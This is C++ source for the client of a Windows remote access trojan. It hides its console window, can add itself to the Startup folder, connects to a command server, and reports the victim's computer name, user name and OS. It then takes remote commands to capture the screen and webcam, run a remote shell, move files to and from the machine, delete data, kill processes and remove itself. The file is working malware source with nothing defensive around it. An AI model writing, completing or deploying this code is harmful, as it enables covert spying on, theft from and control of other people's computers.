#include <iostream>
#include <fstream>
#include <vector>
#include <algorithm>
#include <dirent.h>
#include <dshow.h>

const std::string SERVER = "localhost";
const int PORT = 5005;

std::vector<std::string> logs;
std::string username = getenv("username");
std::string computer = getenv("computername");
std::string appdata = getenv("appdata");
std::string operatingSystem = getenv("os");
std::string startupPath = "C:/Users/" + username + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
std::string command, fileName, originalPlacementPath;

SOCKET objSocket;
char buffer[16384];
const bool startup = false;
const int timeout = 300000;

#include "utilities.h"
#include "RegisterStartup.cpp"
#include "VBSMessageBox.cpp"
#include "CaptureScreenshot.cpp"
#include "CaptureWebcam.cpp"
#include "ChangeWallpaper.cpp"
#include "ViewTasks.cpp"
#include "IdleTime.cpp"
#include "StartProcess.cpp"
#include "KillProcess.cpp"
#include "RemoteCMD.cpp"
#include "WakeComputer.cpp"
#include "ViewFiles.cpp"
#include "SendFile.cpp"
#include "ReceiveFile.cpp"
#include "ReadFile.cpp"
#include "MoveFile.cpp"
#include "DeleteFile.cpp"
#include "DeleteDirectory.cpp"
#include "DeleteSelf.cpp"

void Server()
{
    WSADATA wsdata;
    sockaddr_in client;
    struct in_addr addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsdata) != 0) exit(1);
    addr.s_addr = *(u_long*) gethostbyname(SERVER.data())->h_addr_list[0];
    objSocket = socket(AF_INET, SOCK_STREAM, 0);

    client.sin_family = AF_INET;
    client.sin_port = htons(PORT);
    client.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
    setsockopt(objSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

    if (connect(objSocket, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
        closesocket(objSocket);
        WSACleanup();
        Sleep(1000);
        Server();
    }

    send(computer + "\n" + username + "\n" + operatingSystem + "\n" + fileName);
    while (true)
    {
        memset(buffer, 0, sizeof(buffer));
        command.clear();

        ssize_t server = recv(objSocket, buffer, sizeof(buffer), 0);
        if (server == SOCKET_ERROR || server == NO_BYTES_IN_BUFFER || server == sizeof(buffer)) {
            closesocket(objSocket);
            WSACleanup();
            ClearLogs();
            Server();
        
        } command = buffer;

        if (command == "test") {
            send("success");
        }
        else if (command == "terminate") {
            closesocket(objSocket);
            WSACleanup();
            ClearLogs();
            exit(0);
		}
        else if (command == "msgbox") {
            VBSMessageBox();
        }
        else if (command == "screenshot") {
            CaptureScreenshot();
        }
        else if (command == "webcam") {
            CaptureWebcam();
        }
        else if (command == "wallpaper") {
            ChangeWallpaper();
        }
        else if (command == "tasklist") {
            ViewTasks();
        }
        else if (command == "idletime") {
            IdleTime();
        }
        else if (command == "stprocess") {
            StartProcess();
        }
        else if (command == "klprocess") {
            KillProcess();
        }
        else if (command == "remote") {
            RemoteCMD();
        }
        else if (command == "wake-computer") {
            WakeComputer();
        }
        else if (command == "shutdown") {
            system("shutdown /p");
        }
        else if (command == "restart") {
            system("shutdown /r");
        }
        else if (command == "lock") {
            system("rundll32.exe user32.dll,LockWorkStation");
        }
        else if (command == "directory") {
            getcwd(buffer, FILENAME_MAX);
            send(buffer);
        }
        else if (command == "files") {
            ViewFiles();
        }
        else if (command == "send") {
            SendFile();
        }
        else if (command == "receive") {
            ReceiveFile();
        }
        else if (command == "read") {
            ReadFile();
        }
        else if (command == "move") {
            MoveFile();
        }
        else if (command == "delfile") {
            DeleteFile();
        }
        else if (command == "deldir") {
            DeleteDirectory();
        }
        else if (command == "delself") {
            DeleteSelf();
        }
    }
}

int main()
{
    AllocConsole();
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    GetModuleFileNameA(nullptr, buffer, MAX_PATH);

    originalPlacementPath = buffer;
    fileName = originalPlacementPath.substr(originalPlacementPath.find_last_of("/\\") + 1);

    CreateMutexA(0, FALSE, fileName.data());
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return EXIT_FAILURE;
    }
    if (startup) RegisterStartup(fileName);
    Server();
}